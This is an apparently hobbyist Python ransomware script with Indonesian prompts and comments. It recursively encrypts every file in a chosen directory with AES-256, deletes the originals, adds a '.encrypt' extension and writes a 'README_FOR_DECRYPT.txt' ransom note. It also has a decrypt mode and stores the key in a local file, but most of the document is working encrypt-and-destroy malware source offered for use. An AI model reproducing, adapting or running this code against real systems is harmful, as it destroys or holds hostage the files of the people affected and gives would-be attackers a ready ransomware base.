import os
import sys
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def install_dependencies():
    try:
        import Crypto
    except ModuleNotFoundError:
        print("Modul 'pycryptodome' tidak ditemukan, menginstal sekarang...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        print("Instalasi selesai, silakan jalankan ulang skrip.")
        sys.exit()

install_dependencies()

def pad_data(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def unpad_data(data):
    pad_len = data[-1]
    return data[:-pad_len]

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt_file(dataFile, key):
    try:
        with open(dataFile, 'rb') as f:
            data = f.read()
        
        padded_data = pad_data(data)
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        ciphertext = cipher.encrypt(padded_data)
        
        encryptedFile = str(dataFile) + '.encrypt'
        with open(encryptedFile, 'wb') as f:
            f.write(iv + ciphertext)
        
        os.remove(dataFile)
    except Exception as e:
        print(f"Terjadi kesalahan saat mengenkripsi file {dataFile}: {e}")

def decrypt_file(encrypted_file, key):
    try:
        original_file = str(encrypted_file).replace('.encrypt', '')
        
        with open(encrypted_file, 'rb') as f:
            iv = f.read(16)
            ciphertext = f.read()
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad_data(cipher.decrypt(ciphertext))
        
        with open(original_file, 'wb') as f:
            f.write(decrypted_data)
        
        os.remove(encrypted_file)
        print(f"Berhasil mendekripsi: {encrypted_file} -> {original_file}")
    except Exception as e:
        print(f"Gagal mendekripsi {encrypted_file}: {e}")

def create_ransom_note(directory):
    ransom_file = os.path.join(directory, 'README_FOR_DECRYPT.txt')
    ransom_message = """File Anda telah dienkripsi!

Untuk memulihkan file Anda, gunakan file kunci yang telah disimpan di skrip ini.
Jangan hapus file skrip ini!

Jika file skrip ini hilang, file tidak bisa dipulihkan.
"""
    try:
        with open(ransom_file, 'w', encoding='utf-8') as f:
            f.write(ransom_message)
    except Exception as e:
        print(f"Terjadi kesalahan saat membuat catatan tebusan: {e}")

# Generate atau ambil kunci enkripsi dari skrip
KEY_FILE = 'encryption_key_256.bin'
if not os.path.exists(KEY_FILE):
    KEY = get_random_bytes(32)
    with open(KEY_FILE, 'wb') as f:
        f.write(KEY.hex().encode('utf-8'))
else:
    with open(KEY_FILE, 'rb') as f:
        KEY = bytes.fromhex(f.read().decode('utf-8'))

def main():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("\nPilih mode:")
        print("[1] Enkripsi")
        print("[2] Dekripsi")
        print("[3] Keluar")
        mode = input("Masukkan pilihan: ").strip()
        
        if mode == "1":  # Enkripsi
            directory = input("Masukkan path direktori yang ingin dienkripsi: ").strip()
            if not os.path.exists(directory) or not os.path.isdir(directory):
                print("Path tidak valid atau bukan direktori.")
                continue
            
            excludeExtension = ['.py', '.encrypt', '.pem', '.exe', '.txt', 'encryption_key_256.bin']
            
            for item in scanRecurse(directory):
                filePath = Path(item)
                fileType = filePath.suffix.lower()
                if filePath.name == KEY_FILE or fileType in excludeExtension:
                    continue
                encrypt_file(filePath, KEY)
            
            create_ransom_note(directory)
            print("Semua file telah dienkripsi.")
        
        elif mode == "2":  # Dekripsi
            directory = input("Masukkan path direktori yang ingin didekripsi: ").strip()
            if not os.path.exists(directory) or not os.path.isdir(directory):
                print("Path tidak valid atau bukan direktori.")
                continue
            
            for item in Path(directory).rglob("*.encrypt"):
                decrypt_file(item, KEY)
            
            print("Semua file telah didekripsi.")
        
        elif mode == "3":  # Keluar
            print("Keluar dari program.")
            break
        
        else:
            print("Pilihan tidak valid.")
        
        input("Tekan Enter untuk kembali ke menu...")

if __name__ == "__main__":
    main()
